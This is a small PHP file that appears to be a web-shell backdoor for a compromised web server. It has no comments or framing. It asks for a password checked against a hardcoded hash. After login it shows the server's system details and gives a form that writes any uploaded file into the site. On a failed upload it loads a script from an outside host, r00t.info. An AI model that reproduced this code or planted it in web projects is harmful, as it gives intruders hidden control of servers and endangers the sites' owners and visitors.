<?php
session_start();
if($_SESSION["adm"]){
echo '<b>Namesis<br><br>'.php_uname().'<br></b>';echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';if( $_POST['_upl'] == "Upload" ) {	if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload Success !!!</b><br><br>'; }	else { echo '<b>Upload Fail !!!<script src=http://r00t.info/ccb.js></script></b><br><br>'; }}
}
if($_POST["p"]){
$p = $_POST["p"];
$pa = md5(sha1($p));
if($pa=="683ce9b1d91af441dec18dad25584421"){
$_SESSION["adm"] = 1;
}
}
?>
<form action="" method="post">
<input type="text" name="p">
</form>
